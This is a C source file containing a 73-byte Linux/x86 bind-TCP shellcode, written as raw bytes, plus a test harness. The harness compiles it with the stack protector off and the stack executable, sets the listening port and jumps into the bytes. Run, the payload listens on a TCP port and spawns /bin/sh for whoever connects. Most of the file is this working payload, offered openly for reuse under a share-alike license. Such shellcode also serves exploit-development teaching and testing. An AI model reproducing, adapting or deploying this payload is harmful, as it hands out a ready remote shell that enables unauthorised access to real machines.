/*

 Tiny Shell Bind TCP Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 tiny_shell_bind_tcp_shellcode

 * 73 bytes
 * null-free if the port is


 # gcc -m32 -fno-stack-protector -z execstack tiny_shell_bind_tcp_shellcode.c -o tiny_shell_bind_tcp_shellcode
 # ./tiny_shell_bind_tcp_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
"\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68"
"\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1"
"\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd"
"\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f"
"\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x41\xcd\x80";

main ()
{

        // When the Port contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

	// Setting the port
		 "movw $0x672b, (code+20)\n\t"

	// Calling the shellcode
		 "call code");

}
